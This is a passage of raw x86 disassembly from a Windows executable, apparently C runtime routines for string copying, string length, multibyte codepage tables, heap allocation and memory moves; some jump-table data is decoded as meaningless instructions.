  4258a6:	mov    BYTE PTR [edi],al
  4258a8:	add    edi,0x1
  4258ab:	sub    ecx,0x1
  4258ae:	je     0x42594c
  4258b4:	test   edi,0x3
  4258ba:	jne    0x4258a6
  4258bc:	mov    ebx,ecx
  4258be:	shr    ecx,0x2
  4258c1:	jne    0x425937
  4258c3:	mov    BYTE PTR [edi],al
  4258c5:	add    edi,0x1
  4258c8:	sub    ebx,0x1
  4258cb:	jne    0x4258c3
  4258cd:	pop    ebx
  4258ce:	pop    esi
  4258cf:	mov    eax,DWORD PTR [esp+0x8]
  4258d3:	pop    edi
  4258d4:	ret    
  4258d5:	mov    DWORD PTR [edi],edx
  4258d7:	add    edi,0x4
  4258da:	sub    ecx,0x1
  4258dd:	je     0x42587e
  4258df:	mov    edx,0x7efefeff
  4258e4:	mov    eax,DWORD PTR [esi]
  4258e6:	add    edx,eax
  4258e8:	xor    eax,0xffffffff
  4258eb:	xor    eax,edx
  4258ed:	mov    edx,DWORD PTR [esi]
  4258ef:	add    esi,0x4
  4258f2:	test   eax,0x81010100
  4258f7:	je     0x4258d5
  4258f9:	test   dl,dl
  4258fb:	je     0x425929
  4258fd:	test   dh,dh
  4258ff:	je     0x42591f
  425901:	test   edx,0xff0000
  425907:	je     0x425915
  425909:	test   edx,0xff000000
  42590f:	jne    0x4258d5
  425911:	mov    DWORD PTR [edi],edx
  425913:	jmp    0x42592d
  425915:	and    edx,0xffff
  42591b:	mov    DWORD PTR [edi],edx
  42591d:	jmp    0x42592d
  42591f:	and    edx,0xff
  425925:	mov    DWORD PTR [edi],edx
  425927:	jmp    0x42592d
  425929:	xor    edx,edx
  42592b:	mov    DWORD PTR [edi],edx
  42592d:	add    edi,0x4
  425930:	xor    eax,eax
  425932:	sub    ecx,0x1
  425935:	je     0x425943
  425937:	xor    eax,eax
  425939:	mov    DWORD PTR [edi],eax
  42593b:	add    edi,0x4
  42593e:	sub    ecx,0x1
  425941:	jne    0x425939
  425943:	and    ebx,0x3
  425946:	jne    0x4258c3
  42594c:	mov    eax,DWORD PTR [esp+0x10]
  425950:	pop    ebx
  425951:	pop    esi
  425952:	pop    edi
  425953:	ret    
  425954:	int3   
  425955:	int3   
  425956:	int3   
  425957:	int3   
  425958:	int3   
  425959:	int3   
  42595a:	int3   
  42595b:	int3   
  42595c:	int3   
  42595d:	int3   
  42595e:	int3   
  42595f:	int3   
  425960:	mov    ecx,DWORD PTR [esp+0x4]
  425964:	test   ecx,0x3
  42596a:	je     0x425990
  42596c:	mov    al,BYTE PTR [ecx]
  42596e:	add    ecx,0x1
  425971:	test   al,al
  425973:	je     0x4259c3
  425975:	test   ecx,0x3
  42597b:	jne    0x42596c
  42597d:	add    eax,0x0
  425982:	lea    esp,[esp+0x0]
  425989:	lea    esp,[esp+0x0]
  425990:	mov    eax,DWORD PTR [ecx]
  425992:	mov    edx,0x7efefeff
  425997:	add    edx,eax
  425999:	xor    eax,0xffffffff
  42599c:	xor    eax,edx
  42599e:	add    ecx,0x4
  4259a1:	test   eax,0x81010100
  4259a6:	je     0x425990
  4259a8:	mov    eax,DWORD PTR [ecx-0x4]
  4259ab:	test   al,al
  4259ad:	je     0x4259e1
  4259af:	test   ah,ah
  4259b1:	je     0x4259d7
  4259b3:	test   eax,0xff0000
  4259b8:	je     0x4259cd
  4259ba:	test   eax,0xff000000
  4259bf:	je     0x4259c3
  4259c1:	jmp    0x425990
  4259c3:	lea    eax,[ecx-0x1]
  4259c6:	mov    ecx,DWORD PTR [esp+0x4]
  4259ca:	sub    eax,ecx
  4259cc:	ret    
  4259cd:	lea    eax,[ecx-0x2]
  4259d0:	mov    ecx,DWORD PTR [esp+0x4]
  4259d4:	sub    eax,ecx
  4259d6:	ret    
  4259d7:	lea    eax,[ecx-0x3]
  4259da:	mov    ecx,DWORD PTR [esp+0x4]
  4259de:	sub    eax,ecx
  4259e0:	ret    
  4259e1:	lea    eax,[ecx-0x4]
  4259e4:	mov    ecx,DWORD PTR [esp+0x4]
  4259e8:	sub    eax,ecx
  4259ea:	ret    
  4259eb:	push   0x8
  4259ed:	push   0x429658
  4259f2:	call   0x425350
  4259f7:	and    DWORD PTR [ebp-0x4],0x0
  4259fb:	push   0x0
  4259fd:	push   0x1
  4259ff:	call   0x427572
  425a04:	pop    ecx
  425a05:	pop    ecx
  425a06:	jmp    0x425a0f
  425a08:	xor    eax,eax
  425a0a:	inc    eax
  425a0b:	ret    
  425a0c:	mov    esp,DWORD PTR [ebp-0x18]
  425a0f:	or     DWORD PTR [ebp-0x4],0xffffffff
  425a13:	push   0x3
  425a15:	call   DWORD PTR ds:0x42905c
  425a1b:	int3   
  425a1c:	cmp    ecx,DWORD PTR ds:0x45d430
  425a22:	jne    0x425a25
  425a24:	ret    
  425a25:	jmp    0x4259eb
  425a2a:	movzx  eax,BYTE PTR [esp+0x4]
  425a2f:	mov    cl,BYTE PTR [esp+0xc]
  425a33:	test   BYTE PTR [eax+0x45df21],cl
  425a39:	jne    0x425a57
  425a3b:	cmp    DWORD PTR [esp+0x8],0x0
  425a40:	je     0x425a50
  425a42:	movzx  eax,WORD PTR [eax*2+0x429a52]
  425a4a:	and    eax,DWORD PTR [esp+0x8]
  425a4e:	jmp    0x425a52
  425a50:	xor    eax,eax
  425a52:	test   eax,eax
  425a54:	jne    0x425a57
  425a56:	ret    
  425a57:	xor    eax,eax
  425a59:	inc    eax
  425a5a:	ret    
  425a5b:	push   0x4
  425a5d:	push   0x0
  425a5f:	push   DWORD PTR [esp+0xc]
  425a63:	call   0x425a2a
  425a68:	add    esp,0xc
  425a6b:	ret    
  425a6c:	sub    eax,0x3a4
  425a71:	je     0x425a95
  425a73:	sub    eax,0x4
  425a76:	je     0x425a8f
  425a78:	sub    eax,0xd
  425a7b:	je     0x425a89
  425a7d:	dec    eax
  425a7e:	je     0x425a83
  425a80:	xor    eax,eax
  425a82:	ret    
  425a83:	mov    eax,0x404
  425a88:	ret    
  425a89:	mov    eax,0x412
  425a8e:	ret    
  425a8f:	mov    eax,0x804
  425a94:	ret    
  425a95:	mov    eax,0x411
  425a9a:	ret    
  425a9b:	push   edi
  425a9c:	push   0x40
  425a9e:	xor    eax,eax
  425aa0:	pop    ecx
  425aa1:	mov    edi,0x45df20
  425aa6:	rep stos DWORD PTR es:[edi],eax
  425aa8:	stos   BYTE PTR es:[edi],al
  425aa9:	xor    eax,eax
  425aab:	mov    ds:0x45e024,eax
  425ab0:	mov    ds:0x45df1c,eax
  425ab5:	mov    ds:0x45df14,eax
  425aba:	mov    edi,0x45e030
  425abf:	stos   DWORD PTR es:[edi],eax
  425ac0:	stos   DWORD PTR es:[edi],eax
  425ac1:	stos   DWORD PTR es:[edi],eax
  425ac2:	pop    edi
  425ac3:	ret    
  425ac4:	push   ebp
  425ac5:	mov    ebp,esp
  425ac7:	sub    esp,0x518
  425acd:	mov    eax,ds:0x45d430
  425ad2:	xor    eax,DWORD PTR [ebp+0x4]
  425ad5:	push   esi
  425ad6:	mov    DWORD PTR [ebp-0x4],eax
  425ad9:	lea    eax,[ebp-0x18]
  425adc:	push   eax
  425add:	push   DWORD PTR ds:0x45e024
  425ae3:	call   DWORD PTR ds:0x4290c8
  425ae9:	cmp    eax,0x1
  425aec:	mov    esi,0x100
  425af1:	jne    0x425c04
  425af7:	xor    eax,eax
  425af9:	mov    BYTE PTR [ebp+eax*1-0x118],al
  425b00:	inc    eax
  425b01:	cmp    eax,esi
  425b03:	jb     0x425af9
  425b05:	mov    al,BYTE PTR [ebp-0x12]
  425b08:	test   al,al
  425b0a:	mov    BYTE PTR [ebp-0x118],0x20
  425b11:	je     0x425b49
  425b13:	push   ebx
  425b14:	lea    edx,[ebp-0x11]
  425b17:	push   edi
  425b18:	movzx  ecx,BYTE PTR [edx]
  425b1b:	movzx  eax,al
  425b1e:	cmp    eax,ecx
  425b20:	ja     0x425b3f
  425b22:	sub    ecx,eax
  425b24:	inc    ecx
  425b25:	mov    ebx,ecx
  425b27:	shr    ecx,0x2
  425b2a:	lea    edi,[ebp+eax*1-0x118]
  425b31:	mov    eax,0x20202020
  425b36:	rep stos DWORD PTR es:[edi],eax
  425b38:	mov    ecx,ebx
  425b3a:	and    ecx,0x3
  425b3d:	rep stos BYTE PTR es:[edi],al
  425b3f:	inc    edx
  425b40:	mov    al,BYTE PTR [edx]
  425b42:	inc    edx
  425b43:	test   al,al
  425b45:	jne    0x425b18
  425b47:	pop    edi
  425b48:	pop    ebx
  425b49:	push   0x0
  425b4b:	push   DWORD PTR ds:0x45df14
  425b51:	lea    eax,[ebp-0x518]
  425b57:	push   DWORD PTR ds:0x45e024
  425b5d:	push   eax
  425b5e:	push   esi
  425b5f:	lea    eax,[ebp-0x118]
  425b65:	push   eax
  425b66:	push   0x1
  425b68:	call   0x427a78
  425b6d:	push   0x0
  425b6f:	push   DWORD PTR ds:0x45e024
  425b75:	lea    eax,[ebp-0x218]
  425b7b:	push   esi
  425b7c:	push   eax
  425b7d:	push   esi
  425b7e:	lea    eax,[ebp-0x118]
  425b84:	push   eax
  425b85:	push   esi
  425b86:	push   DWORD PTR ds:0x45df14
  425b8c:	call   0x4276bc
  425b91:	push   0x0
  425b93:	push   DWORD PTR ds:0x45e024
  425b99:	lea    eax,[ebp-0x318]
  425b9f:	push   esi
  425ba0:	push   eax
  425ba1:	push   esi
  425ba2:	lea    eax,[ebp-0x118]
  425ba8:	push   eax
  425ba9:	push   0x200
  425bae:	push   DWORD PTR ds:0x45df14
  425bb4:	call   0x4276bc
  425bb9:	add    esp,0x5c
  425bbc:	xor    eax,eax
  425bbe:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  425bc6:	test   cl,0x1
  425bc9:	je     0x425be1
  425bcb:	or     BYTE PTR [eax+0x45df21],0x10
  425bd2:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  425bd9:	mov    BYTE PTR [eax+0x45e040],cl
  425bdf:	jmp    0x425bfd
  425be1:	test   cl,0x2
  425be4:	je     0x425bf6
  425be6:	or     BYTE PTR [eax+0x45df21],0x20
  425bed:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  425bf4:	jmp    0x425bd9
  425bf6:	and    BYTE PTR [eax+0x45e040],0x0
  425bfd:	inc    eax
  425bfe:	cmp    eax,esi
  425c00:	jb     0x425bbe
  425c02:	jmp    0x425c48
  425c04:	xor    eax,eax
  425c06:	cmp    eax,0x41
  425c09:	jb     0x425c24
  425c0b:	cmp    eax,0x5a
  425c0e:	ja     0x425c24
  425c10:	or     BYTE PTR [eax+0x45df21],0x10
  425c17:	mov    cl,al
  425c19:	add    cl,0x20
  425c1c:	mov    BYTE PTR [eax+0x45e040],cl
  425c22:	jmp    0x425c43
  425c24:	cmp    eax,0x61
  425c27:	jb     0x425c3c
  425c29:	cmp    eax,0x7a
  425c2c:	ja     0x425c3c
  425c2e:	or     BYTE PTR [eax+0x45df21],0x20
  425c35:	mov    cl,al
  425c37:	sub    cl,0x20
  425c3a:	jmp    0x425c1c
  425c3c:	and    BYTE PTR [eax+0x45e040],0x0
  425c43:	inc    eax
  425c44:	cmp    eax,esi
  425c46:	jb     0x425c06
  425c48:	mov    ecx,DWORD PTR [ebp-0x4]
  425c4b:	xor    ecx,DWORD PTR [ebp+0x4]
  425c4e:	pop    esi
  425c4f:	call   0x425a1c
  425c54:	leave  
  425c55:	ret    
  425c56:	push   ebp
  425c57:	mov    ebp,esp
  425c59:	sub    esp,0x1c
  425c5c:	mov    eax,ds:0x45d430
  425c61:	xor    eax,DWORD PTR [ebp+0x4]
  425c64:	push   ebx
  425c65:	push   esi
  425c66:	mov    esi,DWORD PTR [ebp+0x8]
  425c69:	xor    ebx,ebx
  425c6b:	cmp    esi,ebx
  425c6d:	mov    DWORD PTR [ebp-0x4],eax
  425c70:	push   edi
  425c71:	je     0x425dcb
  425c77:	xor    edx,edx
  425c79:	xor    eax,eax
  425c7b:	cmp    DWORD PTR [eax+0x45d440],esi
  425c81:	je     0x425ce8
  425c83:	add    eax,0x30
  425c86:	inc    edx
  425c87:	cmp    eax,0xf0
  425c8c:	jb     0x425c7b
  425c8e:	lea    eax,[ebp-0x1c]
  425c91:	push   eax
  425c92:	push   esi
  425c93:	call   DWORD PTR ds:0x4290c8
  425c99:	cmp    eax,0x1
  425c9c:	jne    0x425dc3
  425ca2:	push   0x40
  425ca4:	xor    eax,eax
  425ca6:	cmp    DWORD PTR [ebp-0x1c],0x1
  425caa:	pop    ecx
  425cab:	mov    edi,0x45df20
  425cb0:	rep stos DWORD PTR es:[edi],eax
  425cb2:	stos   BYTE PTR es:[edi],al
  425cb3:	mov    DWORD PTR ds:0x45e024,esi
  425cb9:	mov    DWORD PTR ds:0x45df14,ebx
  425cbf:	jbe    0x425db1
  425cc5:	cmp    BYTE PTR [ebp-0x16],0x0
  425cc9:	je     0x425d89
  425ccf:	lea    ecx,[ebp-0x15]
  425cd2:	mov    dl,BYTE PTR [ecx]
  425cd4:	test   dl,dl
  425cd6:	je     0x425d89
  425cdc:	movzx  eax,BYTE PTR [ecx-0x1]
  425ce0:	movzx  edx,dl
  425ce3:	jmp    0x425d79
  425ce8:	push   0x40
  425cea:	xor    eax,eax
  425cec:	pop    ecx
  425ced:	mov    edi,0x45df20
  425cf2:	rep stos DWORD PTR es:[edi],eax
  425cf4:	lea    ecx,[edx+edx*2]
  425cf7:	shl    ecx,0x4
  425cfa:	mov    DWORD PTR [ebp-0x8],ebx
  425cfd:	stos   BYTE PTR es:[edi],al
  425cfe:	lea    ebx,[ecx+0x45d450]
  425d04:	mov    al,BYTE PTR [ebx]
  425d06:	mov    esi,ebx
  425d08:	jmp    0x425d33
  425d0a:	mov    dl,BYTE PTR [esi+0x1]
  425d0d:	test   dl,dl
  425d0f:	je     0x425d37
  425d11:	movzx  eax,al
  425d14:	movzx  edi,dl
  425d17:	cmp    eax,edi
  425d19:	ja     0x425d2f
  425d1b:	mov    edx,DWORD PTR [ebp-0x8]
  425d1e:	mov    dl,BYTE PTR [edx+0x45d438]
  425d24:	or     BYTE PTR [eax+0x45df21],dl
  425d2a:	inc    eax
  425d2b:	cmp    eax,edi
  425d2d:	jbe    0x425d24
  425d2f:	inc    esi
  425d30:	inc    esi
  425d31:	mov    al,BYTE PTR [esi]
  425d33:	test   al,al
  425d35:	jne    0x425d0a
  425d37:	inc    DWORD PTR [ebp-0x8]
  425d3a:	add    ebx,0x8
  425d3d:	cmp    DWORD PTR [ebp-0x8],0x4
  425d41:	jb     0x425d04
  425d43:	mov    eax,DWORD PTR [ebp+0x8]
  425d46:	mov    ds:0x45e024,eax
  425d4b:	mov    DWORD PTR ds:0x45df1c,0x1
  425d55:	call   0x425a6c
  425d5a:	lea    ecx,[ecx+0x45d444]
  425d60:	mov    esi,ecx
  425d62:	mov    edi,0x45e030
  425d67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d69:	mov    ds:0x45df14,eax
  425d6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d6f:	jmp    0x425dd0
  425d71:	or     BYTE PTR [eax+0x45df21],0x4
  425d78:	inc    eax
  425d79:	cmp    eax,edx
  425d7b:	jbe    0x425d71
  425d7d:	inc    ecx
  425d7e:	inc    ecx
  425d7f:	cmp    BYTE PTR [ecx-0x1],0x0
  425d83:	jne    0x425cd2
  425d89:	xor    ecx,ecx
  425d8b:	inc    ecx
  425d8c:	mov    eax,ecx
  425d8e:	or     BYTE PTR [eax+0x45df21],0x8
  425d95:	inc    eax
  425d96:	cmp    eax,0xff
  425d9b:	jb     0x425d8e
  425d9d:	mov    eax,esi
  425d9f:	call   0x425a6c
  425da4:	mov    ds:0x45df14,eax
  425da9:	mov    DWORD PTR ds:0x45df1c,ecx
  425daf:	jmp    0x425db7
  425db1:	mov    DWORD PTR ds:0x45df1c,ebx
  425db7:	xor    eax,eax
  425db9:	mov    edi,0x45e030
  425dbe:	stos   DWORD PTR es:[edi],eax
  425dbf:	stos   DWORD PTR es:[edi],eax
  425dc0:	stos   DWORD PTR es:[edi],eax
  425dc1:	jmp    0x425dd0
  425dc3:	cmp    DWORD PTR ds:0x45dd84,ebx
  425dc9:	je     0x425dd9
  425dcb:	call   0x425a9b
  425dd0:	call   0x425ac4
  425dd5:	xor    eax,eax
  425dd7:	jmp    0x425ddc
  425dd9:	or     eax,0xffffffff
  425ddc:	mov    ecx,DWORD PTR [ebp-0x4]
  425ddf:	xor    ecx,DWORD PTR [ebp+0x4]
  425de2:	pop    edi
  425de3:	pop    esi
  425de4:	pop    ebx
  425de5:	call   0x425a1c
  425dea:	leave  
  425deb:	ret    
  425dec:	push   0x14
  425dee:	push   0x429668
  425df3:	call   0x425350
  425df8:	or     DWORD PTR [ebp-0x1c],0xffffffff
  425dfc:	push   0xd
  425dfe:	call   0x42550f
  425e03:	pop    ecx
  425e04:	xor    edi,edi
  425e06:	mov    DWORD PTR [ebp-0x4],edi
  425e09:	mov    DWORD PTR ds:0x45dd84,edi
  425e0f:	mov    eax,DWORD PTR [ebp+0x8]
  425e12:	cmp    eax,0xfffffffe
  425e15:	jne    0x425e29
  425e17:	mov    DWORD PTR ds:0x45dd84,0x1
  425e21:	call   DWORD PTR ds:0x4290c4
  425e27:	jmp    0x425e54
  425e29:	cmp    eax,0xfffffffd
  425e2c:	jne    0x425e40
  425e2e:	mov    DWORD PTR ds:0x45dd84,0x1
  425e38:	call   DWORD PTR ds:0x4290c0
  425e3e:	jmp    0x425e54
  425e40:	cmp    eax,0xfffffffc
  425e43:	jne    0x425e54
  425e45:	mov    DWORD PTR ds:0x45dd84,0x1
  425e4f:	mov    eax,ds:0x45ddb4
  425e54:	mov    DWORD PTR [ebp+0x8],eax
  425e57:	cmp    eax,DWORD PTR ds:0x45e024
  425e5d:	je     0x425f1e
  425e63:	mov    esi,DWORD PTR ds:0x45df18
  425e69:	mov    DWORD PTR [ebp-0x20],esi
  425e6c:	cmp    esi,edi
  425e6e:	je     0x425e74
  425e70:	cmp    DWORD PTR [esi],edi
  425e72:	je     0x425e84
  425e74:	push   0x220
  425e79:	call   0x426072
  425e7e:	pop    ecx
  425e7f:	mov    esi,eax
  425e81:	mov    DWORD PTR [ebp-0x20],esi
  425e84:	cmp    esi,edi
  425e86:	je     0x425f07
  425e88:	push   DWORD PTR [ebp+0x8]
  425e8b:	call   0x425c56
  425e90:	pop    ecx
  425e91:	mov    DWORD PTR [ebp-0x1c],eax
  425e94:	cmp    eax,edi
  425e96:	jne    0x425f07
  425e98:	mov    DWORD PTR [esi],edi
  425e9a:	mov    eax,ds:0x45e024
  425e9f:	mov    DWORD PTR [esi+0x4],eax
  425ea2:	mov    eax,ds:0x45df1c
  425ea7:	mov    DWORD PTR [esi+0x8],eax
  425eaa:	mov    eax,ds:0x45df14
  425eaf:	mov    DWORD PTR [esi+0xc],eax
  425eb2:	xor    eax,eax
  425eb4:	mov    DWORD PTR [ebp-0x24],eax
  425eb7:	cmp    eax,0x5
  425eba:	jge    0x425ecc
  425ebc:	mov    cx,WORD PTR [eax*2+0x45e030]
  425ec4:	mov    WORD PTR [esi+eax*2+0x10],cx
  425ec9:	inc    eax
  425eca:	jmp    0x425eb4
  425ecc:	xor    eax,eax
  425ece:	mov    DWORD PTR [ebp-0x24],eax
  425ed1:	cmp    eax,0x101
  425ed6:	jge    0x425ee5
  425ed8:	mov    cl,BYTE PTR [eax+0x45df20]
  425ede:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  425ee2:	inc    eax
  425ee3:	jmp    0x425ece
  425ee5:	xor    eax,eax
  425ee7:	mov    DWORD PTR [ebp-0x24],eax
  425eea:	cmp    eax,0x100
  425eef:	jge    0x425f01
  425ef1:	mov    cl,BYTE PTR [eax+0x45e040]
  425ef7:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  425efe:	inc    eax
  425eff:	jmp    0x425ee7
  425f01:	mov    DWORD PTR ds:0x45df18,esi
  425f07:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  425f0b:	jne    0x425f21
  425f0d:	cmp    esi,DWORD PTR ds:0x45df18
  425f13:	je     0x425f21
  425f15:	push   esi
  425f16:	call   0x425f5a
  425f1b:	pop    ecx
  425f1c:	jmp    0x425f21
  425f1e:	mov    DWORD PTR [ebp-0x1c],edi
  425f21:	or     DWORD PTR [ebp-0x4],0xffffffff
  425f25:	call   0x425f33
  425f2a:	mov    eax,DWORD PTR [ebp-0x1c]
  425f2d:	call   0x42538b
  425f32:	ret    
  425f33:	push   0xd
  425f35:	call   0x42547b
  425f3a:	pop    ecx
  425f3b:	ret    
  425f3c:	cmp    DWORD PTR ds:0x45e26c,0x0
  425f43:	jne    0x425f57
  425f45:	push   0xfffffffd
  425f47:	call   0x425dec
  425f4c:	pop    ecx
  425f4d:	mov    DWORD PTR ds:0x45e26c,0x1
  425f57:	xor    eax,eax
  425f59:	ret    
  425f5a:	push   0xc
  425f5c:	push   0x429678
  425f61:	call   0x425350
  425f66:	mov    esi,DWORD PTR [ebp+0x8]
  425f69:	test   esi,esi
  425f6b:	je     0x425fc5
  425f6d:	cmp    DWORD PTR ds:0x45e144,0x3
  425f74:	jne    0x425fb6
  425f76:	push   0x4
  425f78:	call   0x42550f
  425f7d:	pop    ecx
  425f7e:	and    DWORD PTR [ebp-0x4],0x0
  425f82:	push   esi
  425f83:	call   0x426732
  425f88:	pop    ecx
  425f89:	mov    DWORD PTR [ebp-0x1c],eax
  425f8c:	test   eax,eax
  425f8e:	je     0x425f99
  425f90:	push   esi
  425f91:	push   eax
  425f92:	call   0x42675d
  425f97:	pop    ecx
  425f98:	pop    ecx
  425f99:	or     DWORD PTR [ebp-0x4],0xffffffff
  425f9d:	call   0x425fad
  425fa2:	cmp    DWORD PTR [ebp-0x1c],0x0
  425fa6:	jne    0x425fc5
  425fa8:	push   DWORD PTR [ebp+0x8]
  425fab:	jmp    0x425fb7
  425fad:	push   0x4
  425faf:	call   0x42547b
  425fb4:	pop    ecx
  425fb5:	ret    
  425fb6:	push   esi
  425fb7:	push   0x0
  425fb9:	push   DWORD PTR ds:0x45e140
  425fbf:	call   DWORD PTR ds:0x429048
  425fc5:	call   0x42538b
  425fca:	ret    
  425fcb:	push   0xc
  425fcd:	push   0x429688
  425fd2:	call   0x425350
  425fd7:	mov    esi,DWORD PTR [ebp+0x8]
  425fda:	cmp    DWORD PTR ds:0x45e144,0x3
  425fe1:	jne    0x426011
  425fe3:	cmp    esi,DWORD PTR ds:0x45df04
  425fe9:	ja     0x426011
  425feb:	push   0x4
  425fed:	call   0x42550f
  425ff2:	pop    ecx
  425ff3:	and    DWORD PTR [ebp-0x4],0x0
  425ff7:	push   esi
  425ff8:	call   0x426f11
  425ffd:	pop    ecx
  425ffe:	mov    DWORD PTR [ebp-0x1c],eax
  426001:	or     DWORD PTR [ebp-0x4],0xffffffff
  426005:	call   0x42603d
  42600a:	mov    eax,DWORD PTR [ebp-0x1c]
  42600d:	test   eax,eax
  42600f:	jne    0x426034
  426011:	test   esi,esi
  426013:	jne    0x426016
  426015:	inc    esi
  426016:	cmp    DWORD PTR ds:0x45e144,0x1
  42601d:	je     0x426025
  42601f:	add    esi,0xf
  426022:	and    esi,0xfffffff0
  426025:	push   esi
  426026:	push   0x0
  426028:	push   DWORD PTR ds:0x45e140
  42602e:	call   DWORD PTR ds:0x429030
  426034:	call   0x42538b
  426039:	ret    
  42603a:	mov    esi,DWORD PTR [ebp+0x8]
  42603d:	push   0x4
  42603f:	call   0x42547b
  426044:	pop    ecx
  426045:	ret    
  426046:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  42604b:	ja     0x42606f
  42604d:	push   DWORD PTR [esp+0x4]
  426051:	call   0x425fcb
  426056:	test   eax,eax
  426058:	pop    ecx
  426059:	jne    0x426071
  42605b:	cmp    DWORD PTR [esp+0x8],eax
  42605f:	je     0x426071
  426061:	push   DWORD PTR [esp+0x4]
  426065:	call   0x427c32
  42606a:	test   eax,eax
  42606c:	pop    ecx
  42606d:	jne    0x42604d
  42606f:	xor    eax,eax
  426071:	ret    
  426072:	push   DWORD PTR ds:0x45ddc8
  426078:	push   DWORD PTR [esp+0x8]
  42607c:	call   0x426046
  426081:	pop    ecx
  426082:	pop    ecx
  426083:	ret    
  426084:	int3   
  426085:	int3   
  426086:	int3   
  426087:	int3   
  426088:	int3   
  426089:	int3   
  42608a:	int3   
  42608b:	int3   
  42608c:	int3   
  42608d:	int3   
  42608e:	int3   
  42608f:	int3   
  426090:	push   ebp
  426091:	mov    ebp,esp
  426093:	push   edi
  426094:	push   esi
  426095:	mov    esi,DWORD PTR [ebp+0xc]
  426098:	mov    ecx,DWORD PTR [ebp+0x10]
  42609b:	mov    edi,DWORD PTR [ebp+0x8]
  42609e:	mov    eax,ecx
  4260a0:	mov    edx,ecx
  4260a2:	add    eax,esi
  4260a4:	cmp    edi,esi
  4260a6:	jbe    0x4260b0
  4260a8:	cmp    edi,eax
  4260aa:	jb     0x42622c
  4260b0:	test   edi,0x3
  4260b6:	jne    0x4260cc
  4260b8:	shr    ecx,0x2
  4260bb:	and    edx,0x3
  4260be:	cmp    ecx,0x8
  4260c1:	jb     0x4260ec
  4260c3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4260c5:	jmp    DWORD PTR [edx*4+0x4261dc]
  4260cc:	mov    eax,edi
  4260ce:	mov    edx,0x3
  4260d3:	sub    ecx,0x4
  4260d6:	jb     0x4260e4
  4260d8:	and    eax,0x3
  4260db:	add    ecx,eax
  4260dd:	jmp    DWORD PTR [eax*4+0x4260f0]
  4260e4:	jmp    DWORD PTR [ecx*4+0x4261ec]
  4260eb:	nop
  4260ec:	jmp    DWORD PTR [ecx*4+0x426170]
  4260f3:	nop
  4260f4:	add    BYTE PTR [ecx+0x42],ah
  4260f7:	add    BYTE PTR [ecx+eiz*2],ch
  4260fa:	inc    edx
  4260fb:	add    BYTE PTR [eax+0x61],dl
  4260fe:	inc    edx
  4260ff:	add    BYTE PTR [ebx],ah
  426101:	ror    DWORD PTR [edx-0x75f877fa],1
  426107:	inc    esi
  426108:	add    DWORD PTR [eax+0x468a0147],ecx
  42610e:	add    al,cl
  426110:	jmp    0x289e917
  426115:	add    esi,0x3
  426118:	add    edi,0x3
  42611b:	cmp    ecx,0x8
  42611e:	jb     0x4260ec
  426120:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426122:	jmp    DWORD PTR [edx*4+0x4261dc]
  426129:	lea    ecx,[ecx+0x0]
  42612c:	and    edx,ecx
  42612e:	mov    al,BYTE PTR [esi]
  426130:	mov    BYTE PTR [edi],al
  426132:	mov    al,BYTE PTR [esi+0x1]
  426135:	shr    ecx,0x2
  426138:	mov    BYTE PTR [edi+0x1],al
  42613b:	add    esi,0x2
  42613e:	add    edi,0x2
  426141:	cmp    ecx,0x8
  426144:	jb     0x4260ec
  426146:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426148:	jmp    DWORD PTR [edx*4+0x4261dc]
  42614f:	nop
  426150:	and    edx,ecx
  426152:	mov    al,BYTE PTR [esi]
  426154:	mov    BYTE PTR [edi],al
  426156:	add    esi,0x1
  426159:	shr    ecx,0x2
  42615c:	add    edi,0x1
  42615f:	cmp    ecx,0x8
  426162:	jb     0x4260ec
  426164:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426166:	jmp    DWORD PTR [edx*4+0x4261dc]
  42616d:	lea    ecx,[ecx+0x0]
  426170:	shl    DWORD PTR [ecx+0x42],cl
  426173:	add    al,al
  426175:	popa   
  426176:	inc    edx
  426177:	add    BYTE PTR [eax-0x4fffbd9f],bh
  42617d:	popa   
  42617e:	inc    edx
  42617f:	add    BYTE PTR [eax-0x5fffbd9f],ch
  426185:	popa   
  426186:	inc    edx
  426187:	add    BYTE PTR [eax-0x6fffbd9f],bl
  42618d:	popa   
  42618e:	inc    edx
  42618f:	add    BYTE PTR [ebx-0x761b71bc],cl
  426195:	inc    esp
  426196:	(bad)  
  426197:	in     al,0x8b
  426199:	inc    esp
  42619a:	mov    gs,eax
  42619c:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  4261a0:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  4261a4:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  4261a8:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  4261ac:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4261b0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4261b4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4261b8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4261bc:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4261c0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4261c4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4261c8:	lea    eax,[ecx*4+0x0]
  4261cf:	add    esi,eax
  4261d1:	add    edi,eax
  4261d3:	jmp    DWORD PTR [edx*4+0x4261dc]
  4261da:	mov    edi,edi
  4261dc:	in     al,dx
  4261dd:	popa   
  4261de:	inc    edx
  4261df:	add    ah,dh
  4261e1:	popa   
  4261e2:	inc    edx
  4261e3:	add    BYTE PTR [eax],al
  4261e5:	bound  eax,QWORD PTR [edx+0x0]
  4261e8:	adc    al,0x62
  4261ea:	inc    edx
  4261eb:	add    BYTE PTR [ebx+0x5f5e0845],cl
  4261f1:	leave  
  4261f2:	ret    
  4261f3:	nop
  4261f4:	mov    al,BYTE PTR [esi]
  4261f6:	mov    BYTE PTR [edi],al
  4261f8:	mov    eax,DWORD PTR [ebp+0x8]
  4261fb:	pop    esi
  4261fc:	pop    edi
  4261fd:	leave  
